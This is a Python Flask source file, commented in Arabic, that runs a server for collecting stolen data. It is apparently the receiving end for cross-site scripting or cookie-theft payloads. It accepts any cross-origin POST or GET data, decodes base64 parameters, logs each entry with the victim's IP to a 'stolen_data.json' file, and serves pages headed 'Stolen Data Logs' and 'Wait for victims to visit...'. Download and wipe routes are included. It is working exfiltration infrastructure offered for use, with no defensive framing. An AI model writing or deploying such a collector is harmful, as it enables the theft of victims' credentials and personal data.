from flask import Flask, request, jsonify
import datetime
import json
import os
from pathlib import Path

app = Flask(__name__)

# ✅ CORS headers
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Data Logger</title>
    </head>
    <body>
        <h1>Data Collection Server</h1>
        <p><a href="/logs">View Stolen Data</a></p>
        <p><a href="/download">Download Data</a></p>
    </body>
    </html>
    '''

def save_structured_data(data):
    """حفظ البيانات بشكل مرتب في JSON"""
    log_file = '/tmp/stolen_data.json'
    
    # إذا الملف موجود، اقرأ البيانات الحالية
    existing_data = []
    if os.path.exists(log_file):
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                existing_data = json.load(f)
        except:
            existing_data = []
    
    # إضافة البيانات الجديدة
    new_entry = {
        'id': len(existing_data) + 1,
        'timestamp': datetime.datetime.now().isoformat(),
        'ip_address': request.remote_addr,
        'data': data
    }
    
    existing_data.append(new_entry)
    
    # حفظ الملف
    with open(log_file, 'w', encoding='utf-8') as f:
        json.dump(existing_data, f, indent=2, ensure_ascii=False)
    
    return new_entry

@app.route('/log', methods=['GET', 'POST', 'OPTIONS'])
def log_data():
    if request.method == 'OPTIONS':
        return '', 200
    
    received_data = {}
    
    try:
        if request.method == 'POST':
            if request.is_json:
                received_data = request.json
            else:
                received_data = {'raw_data': request.data.decode('utf-8')}
        elif request.method == 'GET':
            received_data = dict(request.args)
            
            # فك تشفير البيانات إذا كانت مشفرة
            if 'data' in received_data:
                try:
                    received_data['decoded_data'] = json.loads(received_data['data'])
                except:
                    try:
                        import base64
                        decoded_str = base64.b64decode(received_data['data']).decode('utf-8')
                        received_data['decoded_data'] = json.loads(decoded_str)
                    except:
                        received_data['decoded_data'] = 'could_not_decode'
        
        # ✅ حفظ البيانات بشكل مرتب
        saved_entry = save_structured_data(received_data)
        
        print('🎯 NEW STRUCTURED DATA SAVED!')
        print(f'📁 Entry ID: {saved_entry["id"]}')
        print(f'⏰ Time: {saved_entry["timestamp"]}')
        print(f'🌐 IP: {saved_entry["ip_address"]}')
        print('=' * 50)
        
        return jsonify({
            'status': 'success', 
            'entry_id': saved_entry['id'],
            'message': 'Data saved in structured format'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

@app.route('/logs')
def view_logs():
    """عرض البيانات بشكل مرتب"""
    try:
        log_file = '/tmp/stolen_data.json'
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            html = '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Stolen Data Logs</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; }
                    .entry { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
                    .entry-id { color: #007bff; font-weight: bold; }
                    .timestamp { color: #6c757d; font-size: 0.9em; }
                    .ip { color: #28a745; }
                    pre { background: #f8f9fa; padding: 10px; border-radius: 3px; overflow-x: auto; }
                </style>
            </head>
            <body>
                <h1>📊 Stolen Data Logs</h1>
                <p>Total Entries: <strong>''' + str(len(data)) + '''</strong></p>
                <a href="/download">📥 Download JSON File</a>
                <hr>
            '''
            
            for entry in reversed(data):  # عرض أحدث البيانات أولاً
                html += f'''
                <div class="entry">
                    <div class="entry-id">Entry #{entry["id"]}</div>
                    <div class="timestamp">⏰ {entry["timestamp"]}</div>
                    <div class="ip">🌐 IP: {entry["ip_address"]}</div>
                    <pre>{json.dumps(entry["data"], indent=2, ensure_ascii=False)}</pre>
                </div>
                '''
            
            html += '</body></html>'
            return html
        else:
            return '<h1>No data collected yet</h1><p>Wait for victims to visit...</p>'
            
    except Exception as e:
        return f'Error reading logs: {e}'

@app.route('/download')
def download_logs():
    """تحميل ملف JSON"""
    try:
        log_file = '/tmp/stolen_data.json'
        if os.path.exists(log_file):
            return send_file(log_file, as_attachment=True, download_name='stolen_data.json')
        else:
            return 'No data to download'
    except Exception as e:
        return f'Error: {e}'

@app.route('/clear')
def clear_logs():
    """مسح جميع البيانات"""
    try:
        log_file = '/tmp/stolen_data.json'
        if os.path.exists(log_file):
            os.remove(log_file)
        return jsonify({'status': 'success', 'message': 'All logs cleared'})
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
